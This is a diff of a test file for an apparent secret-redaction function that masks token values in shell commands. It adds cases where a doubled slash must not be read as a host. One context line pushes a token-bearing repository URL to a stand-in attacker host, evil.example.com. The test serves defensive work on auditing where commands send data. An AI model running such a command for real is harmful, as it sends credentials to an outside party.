@@ -827,6 +827,13 @@ test("redaction never hides where a command sends or fetches (security audit 202
       "git push https://TOKEN=x@evil.example.com/r.git",
       "git push https://TOKEN=[redacted]@evil.example.com/r.git",
     ],
+    // A `//` that is no scheme's (a doubled path slash, a bare `//`) makes no host: the value hides.
+    [
+      "curl https://api.example.com//TOKEN=abc123",
+      "curl https://api.example.com//TOKEN=[redacted]",
+    ],
+    ["echo hi //TOKEN=hunter2/zz", "echo hi //TOKEN=[redacted]"],
+    ["cat //SECRET=hunter2", "cat //SECRET=[redacted]"],
   ]) {
     expect(redactText(command as string, true)).toBe(shown as string);
     expect(JSON.parse(build("Bash", { command }).input).command).toBe(shown as string);
